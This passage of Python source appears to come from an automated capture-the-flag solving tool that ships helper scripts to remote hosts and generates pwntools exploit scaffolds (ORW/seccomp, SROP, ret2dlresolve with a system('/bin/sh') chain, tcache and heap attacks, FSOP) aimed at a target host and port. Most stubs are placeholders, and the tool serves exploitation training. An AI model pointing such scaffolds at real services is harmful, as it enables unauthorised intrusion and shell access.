                    "stdout": completed.stdout[:12000],
                    "stderr": completed.stderr[:6000],
                })
            except Exception as exc:
                payload["message"] = str(exc)
            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_pwn_libc_setup_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            import os
            import shutil
            import subprocess
            import sys

            if len(sys.argv) < 5:
                raise SystemExit("usage: remote_pwn_libc_setup.py <sample_path> <libc_path> <ld_path> <output_path>")

            sample_path, libc_path, ld_path, output_path = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
            payload = {
                "status": "error",
                "sample_path": sample_path,
                "libc_path": libc_path,
                "ld_path": ld_path,
                "output_path": output_path,
            }
            shutil.copy2(sample_path, output_path)
            try:
                st = os.stat(output_path)
                os.chmod(output_path, st.st_mode | 0o111)
            except Exception:
                pass

            patchelf = shutil.which("patchelf")
            if not patchelf:
                payload["message"] = "patchelf is not installed"
                print(json.dumps(payload, ensure_ascii=False, indent=2))
                raise SystemExit(0)

            commands = []
            if ld_path:
                commands.append([patchelf, "--set-interpreter", ld_path, output_path])
            if libc_path:
                commands.append([patchelf, "--set-rpath", os.path.dirname(libc_path) or ".", output_path])

            reports = []
            for command in commands:
                completed = subprocess.run(command, capture_output=True, text=True, timeout=10)
                reports.append({
                    "command": command,
                    "returncode": completed.returncode,
                    "stdout": completed.stdout[:4000],
                    "stderr": completed.stderr[:4000],
                })
            payload.update({
                "status": "ok" if all(item["returncode"] == 0 for item in reports) else "error",
                "tool": "patchelf",
                "reports": reports,
            })
            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_pwninit_bootstrap_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            import os
            import shutil
            import subprocess
            import sys

            if len(sys.argv) < 4:
                raise SystemExit("usage: remote_pwninit_bootstrap.py <sample_path> <libc_path> <ld_path>")

            sample_path, libc_path, ld_path = sys.argv[1], sys.argv[2], sys.argv[3]
            payload = {"status": "error", "sample_path": sample_path, "libc_path": libc_path, "ld_path": ld_path}
            pwninit = shutil.which("pwninit")
            if not pwninit:
                payload["message"] = "pwninit is not installed"
                print(json.dumps(payload, ensure_ascii=False, indent=2))
                raise SystemExit(0)

            command = [pwninit, "--bin", sample_path]
            if libc_path:
                command.extend(["--libc", libc_path])
            if ld_path:
                command.extend(["--ld", ld_path])
            completed = subprocess.run(command, capture_output=True, text=True, timeout=20, cwd=os.path.dirname(sample_path) or None)
            payload.update({
                "status": "ok" if completed.returncode == 0 else "error",
                "command": command,
                "returncode": completed.returncode,
                "stdout": completed.stdout[:12000],
                "stderr": completed.stderr[:6000],
            })
            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_one_gadget_check_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            import shutil
            import subprocess
            import sys

            libc_path = sys.argv[1] if len(sys.argv) > 1 else ""
            payload = {"status": "error", "libc_path": libc_path}
            one_gadget = shutil.which("one_gadget")
            if not one_gadget:
                payload["message"] = "one_gadget is not installed"
                print(json.dumps(payload, ensure_ascii=False, indent=2))
                raise SystemExit(0)
            completed = subprocess.run([one_gadget, libc_path], capture_output=True, text=True, timeout=15)
            payload.update({
                "status": "ok" if completed.returncode == 0 else "error",
                "returncode": completed.returncode,
                "stdout": completed.stdout[:12000],
                "stderr": completed.stderr[:6000],
            })
            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_pwn_hard_probe_template(self, mode):
        template = """\
#!/usr/bin/env python3
import json
import re
import sys

MODE = __MODE__

if len(sys.argv) < 9:
    raise SystemExit("usage: remote_hard_pwn.py <sample_path> <binary_name> <target_host> <target_port> <family_name> <protections_json> <probe_summary_json> <candidate_inputs_json>")

sample_path = sys.argv[1]
binary_name = sys.argv[2]
target_host = sys.argv[3]
try:
    target_port = int(sys.argv[4] or 0)
except Exception:
    target_port = 0
family_name = (sys.argv[5] or "").strip()
try:
    protections = json.loads(sys.argv[6] or "{}")
except Exception:
    protections = {}
try:
    probe_summary = json.loads(sys.argv[7] or "{}")
except Exception:
    probe_summary = {}
try:
    candidate_inputs = json.loads(sys.argv[8] or "[]")
except Exception:
    candidate_inputs = []

functions = [str(item or "").strip() for item in list(probe_summary.get("functions") or []) if str(item or "").strip()]
imports = [str(item or "").strip() for item in list(probe_summary.get("imports") or []) if str(item or "").strip()]
interesting_strings = [str(item or "").strip() for item in list(probe_summary.get("interesting_strings") or []) if str(item or "").strip()]
fmt_clues = [str(item or "").strip() for item in list(probe_summary.get("fmt_clues") or []) if str(item or "").strip()]
signal_blob = "\\n".join(functions + imports + interesting_strings + fmt_clues + [json.dumps(protections, ensure_ascii=False)])
lowered = signal_blob.lower()

payload = {
    "status": "ok",
    "mode": MODE,
    "sample_path": sample_path,
    "binary_name": binary_name,
    "primary_family": family_name,
    "summary": "",
    "constraints": [],
    "blockers": [],
    "exploit_stub_generated": False,
    "stage2_generated": False,
    "stage_status": "classified-only",
    "candidate_flags": [],
    "attempts": [],
    "leak_artifacts": [],
    "resolved_libc_context": {},
    "stage1_payload": {},
    "stage2_payload": {},
    "exploit_transcript": {},
}

def has_any(tokens):
    return any(str(token or "").lower() in lowered for token in list(tokens or []))

def choose_family():
    if family_name:
        return family_name
    if MODE == "orw":
        if has_any(["sandbox"]) and not has_any(["seccomp", "prctl"]):
            return "sandbox-orw"
        if has_any(["mmap", "mprotect", "shellcode", "rwx"]):
            return "shellcode-mmap"
        return "seccomp-orw"
    if MODE == "srop":
        return "srop"
    if MODE == "ret2dlresolve":
        return "ret2dlresolve"
    if MODE == "heap":
        if has_any(["double free", "double-free"]):
            return "heap-double-free"
        if has_any(["tcache", "__free_hook", "__malloc_hook", "poison"]):
            return "heap-tcache-poison"
        if has_any(["unsorted bin", "main_arena"]):
            return "heap-unsorted-bin"
        return "heap-uaf"
    if MODE == "fsop":
        return "fsop"
    return family_name or MODE

def add_constraint(value):
    text = str(value or "").strip()
    if text and text not in payload["constraints"]:
        payload["constraints"].append(text)

def add_blocker(value):
    text = str(value or "").strip()
    if text and text not in payload["blockers"]:
        payload["blockers"].append(text)

def collect_hits(keyword_map):
    hits = {}
    for name, tokens in dict(keyword_map or {}).items():
        matched = []
        for token in list(tokens or []):
            text = str(token or "").strip()
            if text and text.lower() in lowered and text not in matched:
                matched.append(text)
        if matched:
            hits[str(name)] = matched[:6]
    return hits

def pick_targets(tokens):
    items = []
    for token in list(tokens or []):
        text = str(token or "").strip()
        if text and text.lower() in lowered and text not in items:
            items.append(text)
    return items

def pick_first(tokens, fallback=""):
    items = pick_targets(tokens)
    return items[0] if items else fallback

def dedupe_items(values, limit=8):
    items = []
    seen = set()
    for value in list(values or []):
        text = str(value or "").strip()
        marker = text.lower()
        if not text or marker in seen:
            continue
        seen.add(marker)
        items.append(text)
        if len(items) >= limit:
            break
    return items

def infer_menu_choices():
    choice_tokens = {
        "alloc": ["alloc", "add", "create", "new", "malloc"],
        "free": ["free", "delete", "remove", "release"],
        "edit": ["edit", "update", "write", "set", "change"],
        "show": ["show", "view", "print", "read", "display", "dump"],
    }
    guesses = {}
    for entry in interesting_strings:
        raw = str(entry or "").strip()
        match = re.match(r"^\\s*(\\d+)\\s*[\\).:\\-]?\\s*(.+?)\\s*$", raw)
        if not match:
            continue
        choice_number = int(match.group(1))
        label = match.group(2).lower()
        for name, tokens in choice_tokens.items():
            if name in guesses:
                continue
            if any(token in label for token in tokens):
                guesses[name] = choice_number
                break
    return guesses

def choose_preferred(values, preferred_tokens):
    lowered = [(str(item or "").strip(), str(item or "").strip().lower()) for item in list(values or []) if str(item or "").strip()]
    for token in list(preferred_tokens or []):
        needle = str(token or "").strip().lower()
        if not needle:
            continue
        for raw, lowered_value in lowered:
            if needle in lowered_value:
                return raw
    return lowered[0][0] if lowered else ""

family = choose_family()
payload["primary_family"] = family

target_lines = [
    "TARGET_HOST = %r" % target_host,
    "TARGET_PORT = %d" % int(target_port or 0),
    "BINARY_PATH = %r" % sample_path,
]
if not target_host or not target_port:
    target_lines.append("# TODO: fill TARGET_HOST / TARGET_PORT for the live service")

common_lines = [
    "#!/usr/bin/env python3",
    "from pwn import *",
    "",
    "context.binary = ELF(BINARY_PATH, checksec=False)",
    "context.log_level = 'debug'",
] + target_lines + [
    "",
    "def start():",
    "    if TARGET_HOST and TARGET_PORT:",
    "        return remote(TARGET_HOST, TARGET_PORT)",
    "    return process(BINARY_PATH)",
    "",
]

if MODE == "orw":
    payload["summary"] = "Generate a bounded ORW/seccomp stage-1/stage-2 pwntools stub."
    payload["stage_status"] = "stage2-synthesized"
    payload["exploit_stub_generated"] = True
    payload["stage2_generated"] = True
    add_constraint("family=%s" % family)
    add_constraint("prefer remote-first ORW chain over blind fuzzing")
    if has_any(["seccomp", "prctl"]):
        add_constraint("seccomp/prctl markers detected")
    if has_any(["mmap", "mprotect", "shellcode", "rwx"]):
        add_constraint("mmap/mprotect shellcode surface detected")
    if not has_any(["open", "openat", "read", "write", "seccomp", "prctl", "sandbox", "mmap", "mprotect"]):
        add_blocker("missing explicit ORW/seccomp/mmap surface in current probe")
    payload["stage1_payload"] = {
        "kind": "orw-stage1",
        "preview": "resolve writable buffer / gadgets / optional libc leak before ORW",
    }
    payload["stage2_payload"] = {
        "kind": "orw-stage2",
        "preview": "open('flag'); read(fd, buf, 0x80); write(1, buf, 0x80)",
    }
    payload["exploit_stub"] = "\\n".join(common_lines + [
        "def build_stage1():",
        "    # TODO: leak libc or locate writable memory if needed",
        "    return b''",
        "",
        "def build_stage2():",
        "    rop = ROP(context.binary)",
        "    # TODO: fill gadgets / syscall numbers / bss pointer",
        "    return flat(",
        "        b'A' * 0x48,",
        "        # open('flag', 0)",
        "        # read(fd, buf, 0x80)",
        "        # write(1, buf, 0x80)",
        "    )",
        "",
        "def main():",
        "    io = start()",
        "    io.send(build_stage1())",
        "    io.send(build_stage2())",
        "    io.interactive()",
        "",
        "if __name__ == '__main__':",
        "    main()",
        "",
    ])
elif MODE == "srop":
    payload["summary"] = "Generate a bounded SROP pwntools stub with stage-1/2 placeholders."
    payload["stage_status"] = "stage2-synthesized"
    payload["exploit_stub_generated"] = True
    payload["stage2_generated"] = True
    add_constraint("need syscall; ret and SigreturnFrame-compatible control")
    if has_any(["sigreturn", "rt_sigreturn", "syscall", "setcontext"]):
        add_constraint("sigreturn/syscall evidence detected")
    else:
        add_blocker("missing syscall/sigreturn evidence")
    payload["stage1_payload"] = {
        "kind": "srop-frame",
        "preview": "build initial frame to pivot rsp/rip into sigreturn",
    }
    payload["stage2_payload"] = {
        "kind": "srop-stage2",
        "preview": "set registers for execve or ORW after sigreturn",
    }
    payload["exploit_stub"] = "\\n".join(common_lines + [
        "def build_srop_frame():",
        "    frame = SigreturnFrame()",
        "    # TODO: fill frame.rax / rdi / rsi / rdx / rip / rsp",
        "    return bytes(frame)",
        "",
        "def main():",
        "    io = start()",
        "    frame = build_srop_frame()",
        "    payload = flat(",
        "        b'A' * 0x48,",
        "        # TODO: syscall_ret gadget",
        "        frame,",
        "    )",
        "    io.send(payload)",
        "    io.interactive()",
        "",
        "if __name__ == '__main__':",
        "    main()",
        "",
    ])
elif MODE == "ret2dlresolve":
    payload["summary"] = "Generate a bounded ret2dlresolve pwntools stub."
    payload["stage_status"] = "stage2-synthesized"
    payload["exploit_stub_generated"] = True
    payload["stage2_generated"] = True
    add_constraint("prefer binaries with dynamic resolver surface and writable memory")
    relro = str(protections.get("relro") or "").lower()
    if "full" in relro:
        add_blocker("full RELRO may block classic ret2dlresolve flow")
    payload["resolved_libc_context"] = {
        "relro": relro,
        "pie": str(protections.get("pie") or ""),
    }
    payload["stage1_payload"] = {
        "kind": "ret2dlresolve-stage1",
        "preview": "write fake reloc/sym/string table into writable memory",
    }
    payload["stage2_payload"] = {
        "kind": "ret2dlresolve-stage2",
        "preview": "invoke Ret2dlresolvePayload.resolve() chain",
    }
    payload["exploit_stub"] = "\\n".join(common_lines + [
        "def main():",
        "    io = start()",
        "    rop = ROP(context.binary)",
        "    dl = Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh'])",
        "    # TODO: choose writable memory and offset",
        "    chain = rop.chain()",
        "    payload = flat(",
        "        b'A' * 0x48,",
        "        chain,",
        "        dl.payload,",
        "    )",
        "    io.send(payload)",
        "    io.interactive()",
        "",
        "if __name__ == '__main__':",
        "    main()",
        "",
    ])
elif MODE == "heap":
    payload["summary"] = "Generate a heap exploit scaffold with menu primitives, preferred leak/write paths, and a stage-1 continuation plan."
    payload["exploit_stub_generated"] = True
    add_constraint("family=%s" % family)
    menu_primitives = collect_hits({
        "alloc": ["alloc", "add", "create", "new", "malloc"],
        "free": ["free", "delete", "remove", "release"],
        "edit": ["edit", "update", "write", "set", "change"],
        "show": ["show", "view", "print", "read", "display", "dump"],
    })
    inferred_menu_choices = infer_menu_choices()
    menu_choices = {
        "alloc": int(inferred_menu_choices.get("alloc", 1)),
        "free": int(inferred_menu_choices.get("free", 2)),
        "edit": int(inferred_menu_choices.get("edit", 3)),
        "show": int(inferred_menu_choices.get("show", 4)),
    }
    prompt_hints = collect_hits({
        "menu": ["choice", "menu", "option", "select", "cmd"],
        "index": ["index", "idx", "slot", "id"],
        "size": ["size", "len", "length"],
        "data": ["data", "content", "name", "desc", "note", "message"],
    })
    leak_targets = pick_targets(["main_arena", "unsorted bin", "fd", "bk", "_IO_2_1_stdout_", "stdout", "heap", "libc", "stack"])
    write_targets = pick_targets(["__free_hook", "__malloc_hook", "__realloc_hook", "tcache_perthread_struct", "_IO_list_all", "vtable", "stdout"])
    trigger_paths = pick_targets(["malloc", "free", "show", "edit", "exit", "quit"])
    preferred_leak = choose_preferred(
        leak_targets,
        ["main_arena", "_io_2_1_stdout_", "stdout", "heap", "stack", "libc"],
    )
    preferred_write = choose_preferred(
        write_targets,
        ["__free_hook", "__malloc_hook", "tcache_perthread_struct", "_io_list_all", "stdout", "vtable"],
    )
    preferred_trigger = choose_preferred(
        trigger_paths,
        ["free", "malloc", "edit", "show", "exit", "quit"],
    )
    primitive_coverage = dedupe_items(list(menu_primitives.keys()) + [name for name, choice in menu_choices.items() if choice])
    family_strategy_map = {
        "heap-uaf": "reuse freed chunk via show/edit, leak heap/libc, then pivot write into hook or vtable target",
        "heap-double-free": "stabilize double free path, reclaim poisoned chunk, then route write into __free_hook/stdout",
        "heap-tcache-poison": "poison tcache forward pointer, claim controlled chunk, then overwrite __free_hook/stdout",
        "heap-unsorted-bin": "harvest unsorted-bin/main_arena leak first, derive libc base, then pivot allocator metadata to a write target",
    }
    family_strategy = family_strategy_map.get(
        family,
        "collect heap/libc leak, compute base, then convert one stable write primitive into a control-flow trigger",
    )
    stage2_preview = "derive libc base from {0}, then use {1} via {2}".format(
        preferred_leak or "a libc/heap leak",
        preferred_write or "a writable hook/structure",
        preferred_trigger or "a final trigger path",
    )
    payload["stage1_payload"] = {
        "kind": "heap-primitive-plan",
        "family": family,
        "menu_choices": menu_choices,
        "menu_primitives": menu_primitives,
        "primitive_coverage": primitive_coverage,
        "prompt_hints": prompt_hints,
        "leak_targets": leak_targets,
        "write_targets": write_targets,
        "trigger_paths": trigger_paths,
        "preferred_leak_path": preferred_leak,
        "preferred_write_path": preferred_write,
        "preferred_trigger_path": preferred_trigger,
        "family_strategy": family_strategy,
        "stage2_preview": stage2_preview,
        "preview": "adapt menu helpers, leak via %s, then pivot write into %s" % (
            preferred_leak or "a libc/heap target",
            preferred_write or "a writable hook/structure",
        ),
    }
    payload["resolved_libc_context"] = {
        "preferred_leak": preferred_leak,
        "preferred_write": preferred_write,
        "preferred_trigger": preferred_trigger,
        "leak_targets": leak_targets[:4],
        "write_targets": write_targets[:4],
        "needs_safe_linking_review": family in {"heap-double-free", "heap-tcache-poison"},
        "family_strategy": family_strategy,
    }
    payload["leak_artifacts"] = leak_targets[:4]
    if not has_any(["malloc", "free", "tcache", "uaf", "double free", "main_arena"]):
        add_blocker("missing strong heap markers in current probe")
    if "alloc" not in menu_primitives or "free" not in menu_primitives:
        add_blocker("missing alloc/free menu primitives")
    if not leak_targets:
        add_blocker("missing stable heap/libc leak target")
    if family == "heap-tcache-poison" and not write_targets:
        add_blocker("missing tcache poison write target such as __free_hook or stdout")
    if family == "heap-unsorted-bin" and "main_arena" not in [str(item).lower() for item in leak_targets]:
        add_blocker("unsorted-bin path still needs a main_arena-style leak")
    if family == "heap-double-free":
        add_constraint("confirm double free is reachable without immediate abort")
    if family == "heap-tcache-poison":
        add_constraint("need forward-pointer overwrite and safe-linking review")
    if family == "heap-unsorted-bin":
        add_constraint("prefer unsorted-bin leak into main_arena before stage2")
    if family == "heap-uaf":
        add_constraint("confirm freed chunk remains reachable by show/edit path")
    if ("alloc" in menu_primitives and "free" in menu_primitives and ("show" in menu_primitives or "edit" in menu_primitives) and (leak_targets or write_targets)):
        payload["stage_status"] = "stage1-ready"
    else:
        payload["stage_status"] = "skeleton-generated"
    payload["exploit_transcript"] = {
        "preview": "heap scaffold ready: primitives=%s leak=%s write=%s trigger=%s" % (
            ",".join(sorted(menu_primitives.keys())) or "unknown",
            preferred_leak or "pending",
            preferred_write or "pending",
            preferred_trigger or "pending",
        ),
        "status": "stage1-ready" if payload["stage_status"] == "stage1-ready" else "scaffold-ready",
    }
    payload["skeleton"] = "\\n".join(common_lines + [
        "MENU_CHOICES = %r" % menu_choices,
        "MENU_PRIMITIVES = %r" % menu_primitives,
        "PRIMITIVE_COVERAGE = %r" % primitive_coverage,
        "PROMPT_HINTS = %r" % prompt_hints,
        "LEAK_TARGETS = %r" % leak_targets,
        "WRITE_TARGETS = %r" % write_targets,
        "TRIGGER_PATHS = %r" % trigger_paths,
        "PRIMARY_LEAK = %r" % preferred_leak,
        "PRIMARY_WRITE = %r" % preferred_write,
        "PRIMARY_TRIGGER = %r" % preferred_trigger,
        "FAMILY_STRATEGY = %r" % family_strategy,
        "",
        "def _prompt(name, fallback):",
        "    return PROMPT_HINTS.get(name, [fallback])[0].encode()",
        "",
        "def send_choice(io, action):",
        "    io.sendlineafter(_prompt('menu', 'choice'), str(MENU_CHOICES.get(action, 0)).encode())",
        "",
        "def alloc(idx, size, data=b'A'):",
        "    send_choice(io, 'alloc')",
        "    io.sendlineafter(_prompt('index', 'index'), str(idx).encode())",
        "    io.sendlineafter(_prompt('size', 'size'), str(size).encode())",
        "    io.sendafter(_prompt('data', 'data'), data)",
        "",
        "def free(idx):",
        "    send_choice(io, 'free')",
        "    io.sendlineafter(_prompt('index', 'index'), str(idx).encode())",
        "",
        "def edit(idx, data):",
        "    send_choice(io, 'edit')",
        "    io.sendlineafter(_prompt('index', 'index'), str(idx).encode())",
        "    io.sendafter(_prompt('data', 'data'), data)",
        "",
        "def show(idx):",
        "    send_choice(io, 'show')",
        "    io.sendlineafter(_prompt('index', 'index'), str(idx).encode())",
        "    return io.recvuntil(b'\\n', drop=False)",
        "",
        "def bootstrap_heap_plan():",
        "    return {",
        "        'family': %r," % family,
        "        'menu_choices': MENU_CHOICES,",
        "        'primitive_coverage': PRIMITIVE_COVERAGE,",
        "        'preferred_leak': PRIMARY_LEAK,",
        "        'preferred_write': PRIMARY_WRITE,",
        "        'preferred_trigger': PRIMARY_TRIGGER,",
        "        'leak_targets': LEAK_TARGETS,",
        "        'write_targets': WRITE_TARGETS,",
        "        'trigger_paths': TRIGGER_PATHS,",
        "        'strategy': FAMILY_STRATEGY,",
        "    }",
        "",
        "def perform_leak_round(io, plan):",
        "    log.info('leak round -> %s' % (plan['preferred_leak'] or plan['leak_targets']))",
        "    # TODO: allocate/free/show in the order required by the live menu and parse the leak",
        "    return None",
        "",
        "def perform_write_round(io, plan, libc_base=0):",
        "    log.info('write round -> %s' % (plan['preferred_write'] or plan['write_targets']))",
        "    # TODO: consume libc_base, poison the next allocation, and land a controlled write",
        "    return None",
        "",
        "def trigger_stage2(io, plan):",
        "    log.info('trigger -> %s' % (plan['preferred_trigger'] or plan['trigger_paths']))",
        "    # TODO: free/malloc/exit along the final trigger path after the overwrite lands",
        "    return None",
        "",
        "def run_family_stage1(io, plan):",
        "    leak = perform_leak_round(io, plan)",
        "    perform_write_round(io, plan, libc_base=0)",
        "    trigger_stage2(io, plan)",
        "    return leak",
        "",
        "def main():",
        "    io = start()",
        "    plan = bootstrap_heap_plan()",
        "    log.info('family=%s leak=%%s write=%%s trigger=%%s' %% (plan['preferred_leak'], plan['preferred_write'], plan['preferred_trigger']))" % family,
        "    run_family_stage1(io, plan)",
        "    # TODO: finalize %s leak-to-stage2 chain once offsets and prompts are confirmed" % family,
        "    io.interactive()",
        "",
        "if __name__ == '__main__':",
        "    main()",
        "",
    ])
elif MODE == "fsop":
    payload["summary"] = "Generate an FSOP scaffold with preferred FILE targets, trigger paths, and a stage-1 continuation plan."
    payload["exploit_stub_generated"] = True
    file_targets = pick_targets(["_IO_2_1_stdout_", "_IO_2_1_stderr_", "_IO_list_all", "_IO_FILE", "_IO_wide_data", "vtable", "stdout", "stderr"])
    trigger_paths = pick_targets(["fflush", "fclose", "exit", "abort", "puts", "printf", "_IO_flush_all_lockp", "flush"])
    write_targets = pick_targets(["_IO_list_all", "vtable", "_IO_2_1_stdout_", "_IO_2_1_stderr_", "_IO_wide_data"])
    preferred_file_target = choose_preferred(
        file_targets,
        ["_io_2_1_stdout_", "_io_list_all", "_io_2_1_stderr_", "stdout", "stderr", "vtable"],
    )
    preferred_trigger = choose_preferred(
        trigger_paths,
        ["fflush", "fclose", "exit", "_io_flush_all_lockp", "abort", "puts", "printf"],
    )
    preferred_write = choose_preferred(
        write_targets,
        ["_io_list_all", "_io_2_1_stdout_", "_io_2_1_stderr_", "_io_wide_data", "vtable"],
    )
    fake_file_fields = ["_flags", "_IO_read_ptr", "_IO_write_base", "_IO_write_ptr", "_lock", "vtable"]
    add_constraint("need FILE structure target such as _IO_2_1_stdout_ / _IO_list_all")
    payload["stage1_payload"] = {
        "kind": "fsop-trigger-plan",
        "family": family,
        "file_targets": file_targets,
        "trigger_paths": trigger_paths,
        "write_targets": write_targets,
        "preferred_file_target": preferred_file_target,
        "preferred_trigger_path": preferred_trigger,
        "preferred_write_path": preferred_write,
        "fake_file_fields": fake_file_fields,
        "preview": "forge FILE around %s and trigger via %s" % (
            preferred_file_target or "_IO_2_1_stdout_",
            preferred_trigger or "fflush/exit",
        ),
    }
    payload["resolved_libc_context"] = {
        "needs_libc_base": True,
        "file_targets": file_targets[:4],
        "trigger_paths": trigger_paths[:4],
        "preferred_file_target": preferred_file_target,
        "preferred_trigger": preferred_trigger,
        "preferred_write": preferred_write,
        "fake_file_fields": fake_file_fields,
    }
    payload["leak_artifacts"] = [item for item in file_targets if str(item).lower() in {"_io_2_1_stdout_", "stdout", "_io_2_1_stderr_", "stderr"}][:3]
    if not has_any(["_io_", "stdout", "stderr", "vtable"]):
        add_blocker("missing _IO_/FILE evidence in current probe")
    if not trigger_paths:
        add_blocker("missing flush/close/exit-style trigger path")
    if file_targets and trigger_paths:
        payload["stage_status"] = "stage1-ready"
    else:
        payload["stage_status"] = "skeleton-generated"
    payload["exploit_transcript"] = {
        "preview": "fsop scaffold ready: file=%s trigger=%s write=%s" % (
            preferred_file_target or "pending",
            preferred_trigger or "pending",
            preferred_write or "pending",
        ),
        "status": "stage1-ready" if payload["stage_status"] == "stage1-ready" else "scaffold-ready",
    }
    payload["skeleton"] = "\\n".join(common_lines + [
        "FILE_TARGETS = %r" % file_targets,
        "TRIGGER_PATHS = %r" % trigger_paths,
        "WRITE_TARGETS = %r" % write_targets,
        "PRIMARY_FILE_TARGET = %r" % preferred_file_target,
        "PRIMARY_TRIGGER = %r" % preferred_trigger,
        "PRIMARY_WRITE = %r" % preferred_write,
        "FAKE_FILE_FIELDS = %r" % fake_file_fields,
        "LIBC_NOTE = %r" % payload["resolved_libc_context"],
        "",
        "def bootstrap_fsop_plan():",
        "    return {",
        "        'target': PRIMARY_FILE_TARGET,",
        "        'trigger': PRIMARY_TRIGGER,",
        "        'write_target': PRIMARY_WRITE,",
        "        'fake_file_fields': FAKE_FILE_FIELDS,",
        "        'file_targets': FILE_TARGETS,",
        "        'trigger_paths': TRIGGER_PATHS,",
        "        'write_targets': WRITE_TARGETS,",
        "    }",
        "",
        "def build_fake_file(libc_base=0, system_addr=0, binsh_addr=0):",
        "    # TODO: craft FILE structure / wide_data / vtable as needed",
        "    # preferred target: %s" % (pick_first(["_IO_2_1_stdout_", "_IO_list_all", "_IO_2_1_stderr_"], "_IO_2_1_stdout_")),
        "    # fields to confirm: %s" % ", ".join(fake_file_fields),
        "    return b''",
        "",
        "def place_fake_file(io, fake_file):",
        "    # TODO: adapt the write primitive that lands fake_file at PRIMARY_WRITE / PRIMARY_FILE_TARGET",
        "    return None",
        "",
        "def trigger_fsop(io):",
        "    # TODO: choose one of TRIGGER_PATHS and adapt prompt/flow",
        "    # example: fflush(stdout) / fclose(stream) / exit()",
        "    return None",
        "",
        "def main():",
        "    io = start()",
        "    plan = bootstrap_fsop_plan()",
        "    fake_file = build_fake_file()",
        "    log.info('file_target=%s trigger=%s write_target=%s' % (plan['target'], plan['trigger'], plan['write_target']))",
        "    place_fake_file(io, fake_file)",
        "    # TODO: confirm libc base, finalize fake FILE layout, then trigger flush/close/_IO_list_all path",
        "    trigger_fsop(io)",
        "    io.interactive()",
        "",
        "if __name__ == '__main__':",
        "    main()",
        "",
    ])

if payload.get("stage2_generated") and not payload.get("stage2_payload"):
    payload["stage2_payload"] = {"kind": "stage2", "preview": "generated"}
if payload.get("exploit_stub_generated") and not payload.get("exploit_transcript"):
    payload["exploit_transcript"] = {
        "preview": "generated %s stub for %s" % (MODE, family),
    }

print(json.dumps(payload, ensure_ascii=False, indent=2))
"""
        return textwrap.dedent(template.replace("__MODE__", json.dumps(str(mode or ""))))

    def _workspace_root_from_value(self, remote_workspace):
        if isinstance(remote_workspace, dict):
            return remote_workspace.get("workspace_root") or ""
        return str(remote_workspace or "")

    def _ensure_remote_parent(self, sftp, remote_path):
        parent = posixpath.dirname(self._normalize_remote_path(remote_path))
        if not parent or parent == ".":
            return
        parts = [item for item in parent.split("/") if item]
        current = ""
        for part in parts:
            current = posixpath.join(current, part) if current else "/{0}".format(part)
            try:
                sftp.stat(current)
            except Exception:
                sftp.mkdir(current)

    def _auto_select_enabled(self, category, target_summary):
        if category in {"pwn", "re", "reverse"}:
            return bool(self.policy.get("auto_select_for_binary", True)), "automatic remote selection disabled for binary categories"
        if category == "misc":
            return bool(self.policy.get("auto_select_for_misc", False)), "automatic remote selection disabled for misc"
        if category == "web":
            enabled = bool(self.policy.get("auto_select_for_web", False))
            if not enabled:
                return False, "automatic remote selection disabled for web"
            if self.policy.get("require_public_target_for_web", True) and not target_summary.get("is_public", False):
                return False, "web target is not public-routable, so automatic remote replay is skipped"
            return True, "automatic remote selection enabled for web"
        return False, "automatic remote selection is disabled for this category"

    def _rank_candidates(self, category, target_summary):
        ranked = []
        for name in self.list_hosts():
            host = dict(self.hosts.get(name, {}))
            score, reasons = self._score_host(name, host, category, target_summary)
            ranked.append(
                {
                    "name": name,
                    "score": score,
                    "host": host.get("host", ""),
                    "username": host.get("username", ""),
                    "preferred_for": list(host.get("preferred_for", [])),
                    "reasons": reasons,
                }
            )
        ranked.sort(key=lambda item: (-item["score"], item["name"]))
        return ranked

    def _score_host(self, name, host, category, target_summary):
        score = 0
        reasons = []
        preferred_for = [str(item).strip().lower() for item in list(host.get("preferred_for", []))]
        name_lower = str(name).lower()
        username = str(host.get("username", "")).lower()
        preferred_hosts_by_category = dict(self.policy.get("preferred_hosts_by_category", {}) or {})
        explicit_preferred_hosts = [
            str(item).strip().lower()
            for item in list(preferred_hosts_by_category.get(category, []))
            if str(item).strip()
        ]
        if category in preferred_for:
            score += 70
            reasons.append("preferred_for matches category")
        elif category in {"pwn", "re", "reverse"} and any(item in preferred_for for item in {"pwn", "re", "reverse"}):
            score += 24
            reasons.append("preferred_for matches binary workflow")
        elif category == "web" and "web" in preferred_for:
            score += 20
            reasons.append("preferred_for includes web")

        if explicit_preferred_hosts:
            if name_lower in explicit_preferred_hosts:
                score += 120
                reasons.append("explicit preferred host for category")
            else:
                score -= 12
                reasons.append("not in explicit preferred host set")

        for keyword in list(self.policy.get("prefer_keywords", [])):
            token = str(keyword).strip().lower()
            if not token:
                continue
            if token in name_lower or token == username:
                score += 8
                reasons.append("preferred keyword: {0}".format(token))
                break

        for keyword in list(self.policy.get("fallback_keywords", [])):
            token = str(keyword).strip().lower()
            if not token:
                continue
            if token in name_lower or token == username:
                score += 2
                reasons.append("fallback keyword: {0}".format(token))
                break

        if "primary" in name_lower:
            score += 3
            reasons.append("primary host")
        elif "backup" in name_lower:
            score += 1
            reasons.append("backup host")

        if host.get("python_bin"):
            score += 1
            reasons.append("python available")

        if category == "pwn" and "ubuntu" in name_lower:
            score += 16
            reasons.append("ubuntu host preferred for pwn environment")

        if category == "web" and target_summary.get("is_public", False):
            score += 6
            reasons.append("public target can be replayed remotely")

        return score, reasons

    def _inspect_target(self, target):
        text = str(target or "").strip()
        payload = {
            "raw": text,
            "host": "",
            "scheme": "",
            "is_local_path": False,
            "is_loopback": False,
            "is_private": False,
            "is_reserved": False,
            "is_public": False,
        }
        if not text:
            return payload

        if "\\" in text or ("/" in text and "://" not in text):
            if Path(text).exists() or text.startswith(".") or text.startswith("~") or ":" in text[:3]:
                payload["is_local_path"] = True
                return payload

        parsed = urlparse(text if "://" in text else "//{0}".format(text))
        host = parsed.hostname or ""
        payload["host"] = host
        payload["scheme"] = parsed.scheme or ""
        if not host:
            return payload
        if host.lower() == "localhost":
            payload["is_loopback"] = True
            return payload

        try:
